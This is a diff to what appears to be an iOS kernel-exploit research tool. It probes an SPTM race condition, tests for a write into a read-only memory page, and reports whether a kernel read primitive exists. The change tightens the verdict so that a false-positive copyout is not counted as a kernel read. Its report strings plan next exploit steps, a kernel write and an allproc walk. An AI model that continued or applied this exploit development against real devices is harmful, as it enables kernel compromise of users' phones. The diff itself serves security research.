@@ -166,6 +166,7 @@ static void *sptm_write_thread(void *arg) {
     // set_maximum=TRUE to READ, then attempt a marker write. Any success here
     // would be a real write-into-RO primitive.
     [report appendString:@"\n--- Phase 2b: strict RO-write check (set_maximum=TRUE) ---\n"];
+    BOOL roPrimitive = NO;
     vm_address_t roPage = 0;
     if (vm_allocate(mach_task_self(), &roPage, 4096, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
         memset((void *)roPage, 0x11, 4096);
@@ -176,6 +177,7 @@ static void *sptm_write_thread(void *arg) {
         uint32_t got = *(volatile uint32_t *)roPage;
         [report appendFormat:@"vm_write into max-READ page: kr=%d readback=0x%x\n", wk, got];
         if (wk == KERN_SUCCESS && got == 0xDEADBEEF) {
+            roPrimitive = YES;
             [report appendString:@"RO_WRITE_PRIMITIVE: YES (write into max-READ page landed!)\n"];
         } else {
             [report appendString:@"RO_WRITE_PRIMITIVE: NO (ceiling holds; earlier successes were the RW window)\n"];
@@ -362,11 +364,18 @@ static void *sptm_write_thread(void *arg) {
     }
 
     // --- Verdict ---
+    // Per 120328 analysis: sysctl copyout landing in the page during the legal
+    // RW window (maxProt=0x7) is NOT a kernel read. KREAD_READY requires the
+    // honest path: no legal write ceiling AND a real RO-write primitive.
     [report appendString:@"\n"];
-    if (gotData && successes > 0) {
+    if (gotData && successes > 0 && !maxAllowsWrite && roPrimitive) {
         [report appendString:@"VERDICT: SPTM_RACE_KREAD_READY\n"];
         [report appendString:@"SPTM race works. Kernel read via copyout confirmed.\n"];
         [report appendString:@"Next: double-copyin for kernel write, or allproc walk.\n"];
+    } else if (gotData && successes > 0 && maxAllowsWrite) {
+        [report appendString:@"VERDICT: SPTM_RACE_KREAD_NOT_PROVEN\n"];
+        [report appendString:@"sysctl copyout landed in the LEGAL RW window (maxProt has WRITE).\n"];
+        [report appendString:@"No RO-write primitive (RO_WRITE_PRIMITIVE=NO) — this is not a kernel read.\n"];
     } else if (successes > 0) {
         [report appendString:@"VERDICT: SPTM_RACE_ONLY\n"];
         [report appendString:@"Race works but kernel read not confirmed.\n"];
